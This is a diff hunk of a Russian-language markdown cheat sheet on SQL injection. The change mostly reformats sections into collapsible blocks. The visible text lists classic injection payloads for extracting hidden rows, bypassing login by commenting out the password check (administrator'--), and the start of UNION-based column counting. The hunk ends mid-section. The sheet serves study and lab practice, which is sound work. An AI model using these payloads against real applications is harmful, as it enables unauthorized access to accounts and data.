@@ -24,17 +24,18 @@ SQL-инъекция — это уязвимость веб-безопаснос
 
 ## Основная причина
 Неправильная фильтрация пользовательского ввода перед подстановкой в SQL-запрос.
-
-## 1. Извлечение скрытых данных (WHERE)
+<details>
+<summary><b>1. Извлечение скрытых данных (WHERE)</b></summary>
 - ' OR 1=1--
 - ' AND 1=1-- (для слепой)
-
-## 2. Обход аутентификации (Login Bypass)
+</details>
+<details>
+<summary><b>2. Обход аутентификации (Login Bypass)</b></summary>
 - admin' --
 - ' OR 1=1; --
 - SELECT * FROM users WHERE username = 'administrator'--' AND password = ''<br>
-
 Измените username параметр, присвоив ему значение:administrator'--
+</details>
 <details>
 <summary><b>🧩 3. UNION-атака (определение кол-во колонок)</b></summary>
 ' ORDER BY 1--<br>
